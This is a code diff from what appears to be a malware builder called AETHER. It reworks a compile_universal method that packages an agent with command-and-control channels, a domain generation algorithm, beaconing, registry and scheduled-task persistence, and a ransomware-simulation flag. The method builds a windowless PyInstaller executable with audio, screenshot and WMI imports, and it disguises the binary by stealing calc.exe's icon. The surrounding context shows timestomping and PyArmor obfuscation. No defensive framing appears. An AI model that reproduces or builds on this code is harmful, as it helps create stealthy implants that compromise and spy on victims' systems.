@@ -222,89 +222,90 @@ class AetherBuilder:
         except Exception as e:
             print(f"[-] Timestomping failed: {e}")
             return executable_path
-    def compile_universal(config_path='../config.json', output_name='aether_agent'):
-    """Compile universal agent with polymorphic configuration."""
-    import json, os, sys, subprocess, tempfile, random, string
-    from datetime import datetime
     
-    # Load master config
-    with open(config_path, 'r') as f:
-        master_config = json.load(f)
-    
-    # Generate unique build ID and seed
-    build_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
-    seed = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
-    
-    # Create unique agent config
-    agent_config = {
-        'build_id': build_id,
-        'build_date': datetime.now().isoformat(),
-        'seed': seed,
-        'universal_c2': master_config.get('c2', {}).get('universal_c2', {}),
-        'dga': master_config.get('c2', {}).get('dga', {}),
-        'beacon': master_config.get('beacon', {}),
-        'persistence_methods': master_config.get('persistence', {}).get('methods', ['registry', 'scheduled_task']),
-        'modules': master_config.get('modules', {}),
-        'encryption_key': seed,  # Use seed as encryption key
-        'safe_mode': master_config.get('modules', {}).get('advanced', {}).get('ransomware_sim', True)
-    }
-    
-    # Write temporary config
-    temp_dir = tempfile.mkdtemp()
-    config_file = os.path.join(temp_dir, 'config.json')
-    with open(config_file, 'w') as f:
-        json.dump(agent_config, f)
-    
-    # Generate icon if enabled
-    icon_arg = ''
-    if master_config.get('compilation', {}).get('icon_forge', True):
-        try:
-            from icon_forger import IconForger
-            icon_path = IconForger.steal_icon_from_exe('C:\\Windows\\System32\\calc.exe')
-            if icon_path and os.path.exists(icon_path):
-                icon_arg = f'--icon="{icon_path}"'
-        except:
-            pass
-    
-    # Build PyInstaller command
-    cmd = [
-        'pyinstaller',
-        '--onefile',
-        '--noconsole',
-        '--clean',
-        f'--name={output_name}_{build_id[:8]}',
-        f'--add-data={config_file};.',
-        '--hidden-import=cryptography',
-        '--hidden-import=pyaudio',
-        '--hidden-import=pyautogui',
-        '--hidden-import=PIL',
-        '--hidden-import=win32api',
-        '--hidden-import=win32con',
-        '--hidden-import=win32security',
-        '--hidden-import=pythoncom',
-        '--hidden-import=wmi',
-        '--hidden-import=dns',
-        '--hidden-import=psutil',
-        '--distpath=./dist',
-        '--workpath=./build',
-        '../agent/aether_agent.py'
-    ]
-    
-    # Add icon if available
-    if icon_arg:
-        cmd.insert(2, icon_arg)
-    
-    # Execute compilation
-    print(f"[*] Compiling universal agent (ID: {build_id})...")
-    result = subprocess.run(cmd, capture_output=True, text=True)
-    
-    if result.returncode == 0:
-        print(f"[+] Success! Agent: dist/{output_name}_{build_id[:8]}.exe")
-        print(f"[+] Seed: {seed}")
-        print(f"[+] Config embedded: {len(agent_config)} parameters")
+    def compile_universal(self, config_path='../config.json', output_name='aether_agent'):
+        """Compile universal agent with polymorphic configuration."""
+        import json, os, sys, subprocess, tempfile, random, string
+        from datetime import datetime
         
-        # Generate runner script
-        runner_content = f"""#!/bin/bash
+        # Load master config
+        with open(config_path, 'r') as f:
+            master_config = json.load(f)
+        
+        # Generate unique build ID and seed
+        build_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
+        seed = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        
+        # Create unique agent config
+        agent_config = {
+            'build_id': build_id,
+            'build_date': datetime.now().isoformat(),
+            'seed': seed,
+            'universal_c2': master_config.get('c2', {}).get('universal_c2', {}),
+            'dga': master_config.get('c2', {}).get('dga', {}),
+            'beacon': master_config.get('beacon', {}),
+            'persistence_methods': master_config.get('persistence', {}).get('methods', ['registry', 'scheduled_task']),
+            'modules': master_config.get('modules', {}),
+            'encryption_key': seed,  # Use seed as encryption key
+            'safe_mode': master_config.get('modules', {}).get('advanced', {}).get('ransomware_sim', True)
+        }
+        
+        # Write temporary config
+        temp_dir = tempfile.mkdtemp()
+        config_file = os.path.join(temp_dir, 'config.json')
+        with open(config_file, 'w') as f:
+            json.dump(agent_config, f)
+        
+        # Generate icon if enabled
+        icon_arg = ''
+        if master_config.get('compilation', {}).get('icon_forge', True):
+            try:
+                from icon_forger import IconForger
+                icon_path = IconForger.steal_icon_from_exe('C:\\Windows\\System32\\calc.exe')
+                if icon_path and os.path.exists(icon_path):
+                    icon_arg = f'--icon="{icon_path}"'
+            except:
+                pass
+        
+        # Build PyInstaller command
+        cmd = [
+            'pyinstaller',
+            '--onefile',
+            '--noconsole',
+            '--clean',
+            f'--name={output_name}_{build_id[:8]}',
+            f'--add-data={config_file};.',
+            '--hidden-import=cryptography',
+            '--hidden-import=pyaudio',
+            '--hidden-import=pyautogui',
+            '--hidden-import=PIL',
+            '--hidden-import=win32api',
+            '--hidden-import=win32con',
+            '--hidden-import=win32security',
+            '--hidden-import=pythoncom',
+            '--hidden-import=wmi',
+            '--hidden-import=dns',
+            '--hidden-import=psutil',
+            '--distpath=./dist',
+            '--workpath=./build',
+            '../agent/aether_agent.py'
+        ]
+        
+        # Add icon if available
+        if icon_arg:
+            cmd.insert(2, icon_arg)
+        
+        # Execute compilation
+        print(f"[*] Compiling universal agent (ID: {build_id})...")
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        
+        if result.returncode == 0:
+            print(f"[+] Success! Agent: dist/{output_name}_{build_id[:8]}.exe")
+            print(f"[+] Seed: {seed}")
+            print(f"[+] Config embedded: {len(agent_config)} parameters")
+            
+            # Generate runner script
+            runner_content = f"""#!/bin/bash
 # AETHER Universal Agent Runner
 # Build ID: {build_id}
 # Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
@@ -319,21 +320,21 @@ echo ""
 echo "C2 Channels:"
 {chr(10).join(['  - ' + chan.get('type', 'unknown') for chan in agent_config.get('universal_c2', {}).get('channels', [])])}
 """
+            
+            runner_file = f'./dist/{output_name}_{build_id[:8]}_info.txt'
+            with open(runner_file, 'w') as f:
+                f.write(runner_content)
+            
+            print(f"[+] Info file: {runner_file}")
+        else:
+            print(f"[-] Compilation failed:")
+            print(result.stderr)
         
-        runner_file = f'./dist/{output_name}_{build_id[:8]}_info.txt'
-        with open(runner_file, 'w') as f:
-            f.write(runner_content)
+        # Cleanup
+        import shutil
+        shutil.rmtree(temp_dir, ignore_errors=True)
         
-        print(f"[+] Info file: {runner_file}")
-    else:
-        print(f"[-] Compilation failed:")
-        print(result.stderr)
-    
-    # Cleanup
-    import shutil
-    shutil.rmtree(temp_dir, ignore_errors=True)
-    
-    return result.returncode == 0
+        return result.returncode == 0
 
 def obfuscate_with_pyarmor():
     """Obfuscate agent code with PyArmor."""
